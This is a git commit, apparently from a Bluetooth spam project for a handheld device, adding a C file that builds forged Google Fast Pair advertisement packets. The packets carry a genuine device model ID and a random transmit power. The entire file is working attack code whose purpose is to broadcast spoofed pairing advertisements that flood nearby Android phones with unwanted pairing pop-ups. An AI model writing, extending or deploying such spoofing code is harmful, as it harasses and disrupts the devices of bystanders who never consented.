cb3c9ec401013e76e401cec3e28175eb4b79e8c6
lexarlumen <65833864+GioeleGregorini@users.noreply.github.com>
2023-10-18 22:09:07 +0200

    Add files via upload

---
+++ ble_spam/protocols/fastpair.c
@@ -0,0 +1,56 @@
+#include "fastpair.h"
+#include "_registry.h"
+
+// Hacked together by @Willy-JL and @Spooks4576
+// Documentation at https://developers.google.com/nearby/fast-pair/specifications/introduction
+
+const char* fastpair_get_name(const BleSpamProtocolCfg* _cfg) {
+    const FastpairCfg* cfg = &_cfg->fastpair;
+    UNUSED(cfg);
+    return "FastPair";
+}
+
+void fastpair_make_packet(uint8_t* _size, uint8_t** _packet, const BleSpamProtocolCfg* _cfg) {
+    const FastpairCfg* cfg = _cfg ? &_cfg->fastpair : NULL;
+
+    uint32_t model_id;
+    if(cfg && cfg->model_id != 0x000000) {
+        model_id = cfg->model_id;
+    } else {
+        const uint32_t models[] = {
+            // Genuine devices
+            0x2E729D, // Edgar
+        };
+        model_id = models[rand() % COUNT_OF(models)];
+    }
+
+    uint8_t size = 14;
+    uint8_t* packet = malloc(size);
+    uint8_t i = 0;
+
+    packet[i++] = 3; // Size
+    packet[i++] = 0x03; // AD Type (Service UUID List)
+    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+    packet[i++] = 0xFE; // ...
+
+    packet[i++] = 6; // Size
+    packet[i++] = 0x16; // AD Type (Service Data)
+    packet[i++] = 0x2C; // Service UUID (Google LLC, FastPair)
+    packet[i++] = 0xFE; // ...
+    packet[i++] = (model_id >> 0x10) & 0xFF; // Model ID
+    packet[i++] = (model_id >> 0x08) & 0xFF; // ...
+    packet[i++] = (model_id >> 0x00) & 0xFF; // ...
+
+    packet[i++] = 2; // Size
+    packet[i++] = 0x0A; // AD Type (Tx Power Level)
+    packet[i++] = (rand() % 120) - 100; // -100 to +20 dBm
+
+    *_size = size;
+    *_packet = packet;
+}
+
+const BleSpamProtocol ble_spam_protocol_fastpair = {
+    .icon = &I_android,
+    .get_name = fastpair_get_name,
+    .make_packet = fastpair_make_packet,
+};
